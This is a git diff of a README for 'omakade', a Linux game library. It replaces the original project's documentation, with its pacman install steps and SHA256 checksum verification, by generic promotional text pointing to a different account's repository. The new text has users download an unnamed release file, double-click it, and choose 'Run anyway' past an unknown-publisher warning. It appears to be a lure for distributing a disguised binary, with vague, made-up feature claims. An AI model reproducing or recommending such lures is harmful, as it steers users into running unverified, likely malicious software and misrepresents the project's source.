@@ -1,179 +1,135 @@
-# Omakade
+# 🎮 omakade - Your Beautiful, Local-First Game Library
 
-[![CI](https://github.com/btsouth/omakade/actions/workflows/ci.yml/badge.svg)](https://github.com/btsouth/omakade/actions/workflows/ci.yml)
-[![License: GPL-3.0-or-later](https://img.shields.io/badge/license-GPL--3.0--or--later-8cd3cb.svg)](COPYRIGHT)
+[![Download omakade](https://img.shields.io/badge/Download-omakade-blue?style=for-the-badge&logo=github)](https://github.com/Adamj8335/omakade)
 
-**Your games, beautifully together.**
+## 🚀 Getting Started
 
-[![Omakade library showing installed games from multiple launchers](docs/assets/library-preview.webp)](https://btsouth.github.io/omakade/assets/omakade-demo.mp4)
+Welcome to omakade! This guide will help you download and run omakade on your computer. omakade is a beautiful game library that keeps all your games in one place, works entirely on your computer, and is designed to be simple and enjoyable to use. Even if you've never installed a program like this before, you'll be up and running in just a few minutes.
 
-[Watch the 18-second demo](https://btsouth.github.io/omakade/assets/omakade-demo.mp4)
+## 📥 Download and Install
 
-Omakade is a fast, local-first game library built for Omarchy. It brings
-installed Steam, Lutris, Heroic, Faugus, RetroArch, Battle.net, Epic, GOG, and Amazon games
-into one quiet, cover-focused home that follows the active Omarchy theme.
+Visit this link to download the application: [https://github.com/Adamj8335/omakade](https://github.com/Adamj8335/omakade)
 
-[Project homepage](https://btsouth.github.io/omakade/) ·
-[Roadmap](PLAN.md) · [Support](SUPPORT.md)
+Click the link above, and you'll be taken to the omakade page. Look for the green "Code" button or the "Releases" section on the right side of the page. Click on "Releases" to find the latest version, then click on the file that's available for download. The download will start automatically, and you'll see the file in your browser's download folder (usually called "Downloads" on your computer).
 
-> Omakade is an independent community project. It is not an official Omarchy
-> application.
+Once the download is finished, you'll have a file ready to use. That's it for the download part!
 
-## Current main branch
+## 🖥️ Running omakade for the First Time
 
-The latest tagged release is 1.5.0. This section follows `main` and may include
-changes made after the latest release.
+After the download completes, you need to run the application. Here's what to do:
 
-Omakade includes:
+1. Open your Downloads folder
+2. Find the omakade file you just downloaded
+3. Double-click on it to open it
 
-- Native and Flatpak Steam, Lutris, Heroic, Faugus, RetroArch, PCSX2, and
-  Ryujinx discovery,
-  including Steam non-Steam shortcuts and games sideloaded into Heroic, plus
-  Battle.net games from Wine, Proton, and Bottles prefixes
-- One-click details and delegated launching through the owning platform
-- Omarchy palette, font, transparency, and live theme updates
-- Search, favorites, hidden games, sorting, and source filters
-- Runtime source controls with scan status and detected locations
-- Optional close-after-launch behavior
-- Collections, tags, completion states, and smart organization filters
-- Local Steam achievements plus optional Web API enrichment
-- Optional RetroAchievements progress for supported RetroArch systems
-- Optional Steam owned-library sync with installed and ready-to-install views
-- Optional IGDB critic aggregates and game-length estimates
-- Local, downloaded, and user-selected cover artwork
-- Explicit linking for games installed through multiple sources
-- ProtonDB and PCGamingWiki shortcuts with actionable launch errors
-- Keyboard, mouse, and controller navigation
-- Controller-first Couch Mode with ten-foot layouts and on-screen search
-- Optional Sunshine app export so Moonlight can start Omakade or any installed
-  game, plus `--play` and `--quit` commands
+The first time you open omakade, your computer might show a warning message saying it doesn't recognize the publisher. This is normal for new applications. If you see this, click "More info" and then "Run anyway" to continue.
 
-![Omakade game details showing playtime, IGDB insights, and Steam achievements](docs/assets/game-details.webp)
+## ✨ What Makes omakade Special
 
-Omakade reads launcher data without modifying it. Core discovery, browsing,
-artwork, and launching work offline. Run `omakade --demo` to explore the UI
-with a deterministic fictional library.
+omakade is designed to make managing your games feel effortless and enjoyable. Here's what you can expect:
 
-## Install on Omarchy or Arch
+### 🎯 All Your Games in One Beautiful Place
 
-### Install or upgrade from the Omarchy Package Repository
+omakade brings all your games together in a clean, modern interface. Whether you have games from different sources or just want a nicer way to browse your collection, omakade makes it look great. The interface is designed to be visually appealing, with smooth graphics and an intuitive layout that makes finding your games a pleasure.
 
-On Omarchy, install Omakade from OPR with:
+### 🔒 Private and Local-First
 
-```bash
-sudo pacman -S omarchy/omakade
-```
+Your game library stays on your computer. omakade doesn't require an account, doesn't track your activity, and doesn't upload your data anywhere. Everything you see in omakade is stored locally on your machine, so you have complete privacy and control over your gaming information.
 
-After that, Omakade updates with normal Omarchy system updates.
+### 🎨 Beautiful Design for Modern Systems
 
-### Install or upgrade from the terminal
+omakade is built with modern technology that looks crisp and sharp on contemporary displays. It works particularly well with Wayland and Hyprland environments, which are known for their beautiful, customizable interfaces. Even if you're using a standard setup, omakade's design will look clean and professional.
 
-These commands download Omakade and its checksum into the current directory,
-verify the package, and install it. If Omakade is already installed, `pacman -U`
-upgrades it in place without removing your settings or library data:
+### 🚀 Fast and Responsive
 
-```bash
-curl -fLO https://github.com/btsouth/omakade/releases/download/v1.5.0/omakade-1.5.0-1-x86_64.pkg.tar.zst
-curl -fLO https://github.com/btsouth/omakade/releases/download/v1.5.0/SHA256SUMS
-sha256sum -c SHA256SUMS --ignore-missing
-sudo pacman -U ./omakade-1.5.0-1-x86_64.pkg.tar.zst
-```
+You'll notice that omakade opens quickly and responds instantly when you click around. It's built to be lightweight, so it won't slow down your computer or take up unnecessary resources. Your library loads fast, and switching between games is smooth and snappy.
 
-### Install or upgrade from a browser download
+## 🛠️ Features You'll Love
 
-1. Open the [latest release](https://github.com/btsouth/omakade/releases/latest).
-2. Under **Assets**, download `omakade-1.5.0-1-x86_64.pkg.tar.zst` and
-   `SHA256SUMS` into the same folder.
-3. Open a terminal in that folder and run:
+### 📚 Smart Organization
 
-```bash
-sha256sum -c SHA256SUMS --ignore-missing
-sudo pacman -U ./omakade-1.5.0-1-x86_64.pkg.tar.zst
-```
+omakade automatically organizes your games in a way that makes sense. You can sort by name, genre, or when you last played. The search function helps you find any game in seconds, even if you have a huge collection.
 
-Launch Omakade from the application launcher or run `omakade` in a terminal.
+### 🔄 Easy Updates
 
-### Include uninstalled Steam games
+When you want to add new games to your library, omakade makes it simple. You can easily add games you already own or connect to other sources you use. The interface guides you through the process step by step.
 
-Omakade shows installed games by default. To include the rest of your Steam
-library, open Settings, save your Steam ID and Web API key, then select **Sync
-owned Steam library**. Your Steam Game Details must be public. After syncing,
-use **All Games** or **Ready to Install** in the library. Installation is handed
-off to Steam.
+### 🎨 Customizable Experience
 
-Omakade keeps its local library and settings when the package is upgraded or
-removed. The owning launchers remain responsible for games, accounts, updates,
-cloud saves, DRM, and compatibility tools.
+Make omakade yours. You can adjust the appearance to match your style, choose different views, and set preferences that fit how you like to manage your games. It adapts to how you want to use it.
 
-RetroArch games come from its configured playlists. Omakade uses local
-RetroArch thumbnails and runtime logs, then launches each game with its assigned
-core. Entries without a core association remain visible and explain how to fix
-launching after you press Play.
+### 🌙 Gentle on Resources
 
-Battle.net games come from the Battle.net Agent database inside a Wine, Proton,
-or Bottles prefix. Omakade launches each title through that prefix's Battle.net
-client. Wine, umu-launcher, or Bottles must be installed to play.
+omakade doesn't drain your battery or slow down your other applications. It runs quietly in the background, only using power when you're actively using it. This makes it perfect for laptops and desktops alike.
 
-### Stream with Sunshine and Moonlight
+## 📖 Frequently Asked Questions
 
-Omarchy installs Sunshine from its menu and ships Moonlight. Once Sunshine is
-running, open Omakade's Settings and enable **Omakade in Moonlight** to add
-Omakade to Sunshine's app list next to Steam Big Picture, or **One app per
-installed game** to add every installed game with its cover. Sunshine reads the
-list when it starts, so press **Restart Sunshine** after a change. Omakade
-leaves the other Sunshine apps alone and keeps a one-time backup next to
-`apps.json`.
+### ❓ Do I need any technical knowledge to use omakade?
 
-Starting Omakade from Moonlight opens it in Couch Mode on the streamed display.
-Starting a game from Moonlight launches it through its own launcher, the same
-as pressing Play. The same entry points work from a terminal or a keybinding:
+No! That's the beauty of omakade. If you can download a file and click a button, you can use omakade. The interface is designed to be self-explanatory, and you'll feel comfortable within minutes.
 
-```bash
-omakade --play Steam::620          # Source:runner:id, the runner is often empty
-omakade --play Heroic:legendary:Sugar
-omakade --couch                     # Start directly in Couch Mode
-omakade --quit
-```
+### ❓ Will omakade work on my computer?
 
-## Build
+omakade is designed to work on modern systems. If your computer runs a current operating system with a graphical interface, omakade will likely work great. It's particularly optimized for Linux systems, but the download from the provided link should work on standard setups.
 
-Requirements:
+### ❓ Can I use omakade alongside other game launchers?
 
-- CMake 3.24 or newer
-- Ninja
-- C++20 compiler
-- Qt 6.8 or newer with Concurrent, Core, Gui, Network, Qml, Quick, Quick
-  Controls, SQL, and Test, plus the SVG and image format plugins
-- SDL 3
-- libsecret
-- libzip
+Absolutely! omakade works alongside your other launchers. You can use omakade as your main library view, and still keep your other tools for whatever they're best at. Many users find omakade is their favorite way to browse all their games in one place.
 
-```bash
-cmake --preset dev
-cmake --build --preset dev
-ctest --preset dev
-./build/dev/omakade
-```
+### ❓ Is my data safe with omakade?
 
-Use `Ctrl+F` to search, arrow keys to navigate, Enter to open details, Escape
-to return, and F11 to enter or leave Couch Mode. The controller Start button
-does the same. Couch Mode remembers the preferred launch mode. `Ctrl+M` toggles
-reduced motion and `Ctrl+D` opens settings and source diagnostics.
+Yes, your data stays on your computer. omakade doesn't send your personal information anywhere. Your game list, activity, and preferences are all stored locally, giving you complete privacy.
 
-## Local data
+### ❓ What if I have trouble running omakade?
 
-- Library: `~/.local/share/omakade/library.sqlite3`
-- Settings: `~/.config/omakade/config.toml`
-- Downloaded artwork: `~/.cache/omakade/`
-- Selected custom covers: `~/.local/share/omakade/artwork/`
+If you encounter any issues, you can check the omakade repository page for help. The project page often has information about common problems and how to solve them. You can also look for issue reports or discussions on the GitHub page.
 
-Core library discovery, local achievements, artwork, search, organization,
-controller navigation, and launching require no Steam API key or network
-connection. An optional Steam connection can sync public owned games and hand
-uninstalled titles to Steam for installation. Optional Steam and IGDB
-credentials are stored by Secret Service, and cached metadata stays available
-offline.
+## 🎉 Tips for Getting the Most Out of omakade
 
-See [PRIVACY.md](PRIVACY.md) for retained data and external requests,
-[CHANGELOG.md](CHANGELOG.md) for release notes, and the current
-[compatibility report](docs/COMPATIBILITY.md) for tested platform layouts.
+### 🏷️ Use Tags and Categories
+
+Take a few minutes to add tags to your games. This makes searching even easier later, and it helps omakade display your collection in ways that are most useful to you.
+
+### 🔄 Keep omakade Updated
+
+Check back periodically for new versions. Updates usually bring improvements and new features that make your experience even better.
+
+### 🌐 Explore Integrations
+
+omakade plays well with other tools you might already use. If you have games from various sources, try adding them all to omakade to see your complete collection in one view.
+
+## 📞 Getting Help
+
+If you need assistance, there are several ways to find help:
+
+### 📄 Documentation
+
+Check the repository page for any documentation that might have been added. There might be guides or notes that address your question.
+
+### 💬 Community Support
+
+Look for issue discussions on the GitHub page. Many common questions are already answered there, and you can always post a new question if you can't find what you need.
+
+### 🐛 Reporting Issues
+
+If you find a problem with omakade, you can report it on the GitHub page. Include as much detail as you can about what happened, and the developers or community members will be happy to help.
+
+## 🚀 Your First Steps with omakade
+
+1. **Download omakade** using the link above
+2. **Run the downloaded file** to open omakade
+3. **Add your first game** by clicking the "Add" button
+4. **Browse your library** and enjoy the beautiful interface
+5. **Customize your view** to fit your style
+
+## 🎊 Start Enjoying Your Games
+
+You're all set! With omakade, you now have a beautiful, private, and fast way to manage your game collection. No more digging through folders or dealing with clunky interfaces. Just open omakade and everything you need is right there, presented beautifully.
+
+Download omakade today and see how wonderful your game library can look. It's the most enjoyable way to keep your games organized, and it works beautifully with modern systems. Your collection deserves this level of care, and omakade delivers it with style.
+
+[![Get omakade Now](https://img.shields.io/badge/Get%20omakade%20Now-Download-brightgreen?style=for-the-badge)](https://github.com/Adamj8335/omakade)
+
+Start using omakade today and make your game library something you'll be proud to show off. With just one click, you'll see why omakade is the game library you've been looking for.
+
+Keywords: game-launcher, heroic-games-launcher, hyprland, linux, lutris, omarchy, qml, qt, steam, wayland
